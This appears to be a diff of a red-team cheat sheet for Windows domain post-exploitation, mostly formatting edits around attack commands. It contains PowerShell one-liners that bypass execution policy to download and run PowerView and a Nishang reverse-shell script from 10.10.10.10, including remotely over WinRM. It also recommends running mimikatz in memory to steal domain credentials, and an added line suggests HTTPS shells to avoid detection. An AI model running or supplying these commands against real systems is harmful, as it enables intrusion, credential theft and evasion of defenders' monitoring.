@@ -18,11 +18,7 @@ This will download to a specific folder and with a specific name as specified in
 
 `Powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadFile('http://10.10.10.10/PowerView.ps1','C:\tmp\PowerView.ps1');"`
 
-
-
 ### BloodHound
-
-
 
 Powershell -exec bypass
 
@@ -38,21 +34,17 @@ Using WMIC, check which users have sessions on a remote machine. Local administr
 wmic /node:box01.lab.local path win32_loggedonuser get antecedent
 ```
 
-
-
 Powershell supports WinRM natively, which allows remote execution of commands. Here is how to execute a command on a remote box the current user has access to only using tokens, \(no prompt for password or PTH\). Here the hostname command is used for verification, but you can essentially replace it with any command, like powershell.
 
 `Invoke-Command -ComputerName BOX01 -Scriptblock {hostname}`
-
-
 
 ### Powerview
 
 Powerview is a super useful set of tools for enumerating a domain. The script and full command list can be found here:
 
-https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
+[https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 
-In powerview, there is a super useful function called `Invoke-EnumerateLocalAdmin` which enumerates which machines the current user is local administrator on. This can be very useful, as you can then remotely execute things like mimikatz on those boxes straight into memory to get the credentials of domain users.
+In powerview, there is a super useful function called `Find-LocalAdminAccess` which enumerates which machines the current user is local administrator on. This can be very useful, as you can then remotely execute things like mimikatz on those boxes straight into memory to get the credentials of domain users. If you need an overview of what groups and users are local admin on every box in the environment you can use `Invoke-EnumerateLocalAdmin`
 
 
 
@@ -72,11 +64,10 @@ Powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadStri
 
 ### Shells
 
-Ninshang shells are the shit https://github.com/samratashok/nishang/tree/master/Shells
+Ninshang shells are the shit [https://github.com/samratashok/nishang/tree/master/Shells](https://github.com/samratashok/nishang/tree/master/Shells)
 
 ```
 Powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1');"
-
 ```
 
 We can do the same thing remotely to a box we have access to using WinRM.
@@ -85,6 +76,8 @@ We can do the same thing remotely to a box we have access to using WinRM.
 Invoke-Command -ComputerName BOX01  -Scriptblock {Powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClien
 t).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1');"}
 ```
+
+Should also start looking into using HTTPS shells here to avoid detection.
 
 ### Token impersonation
 
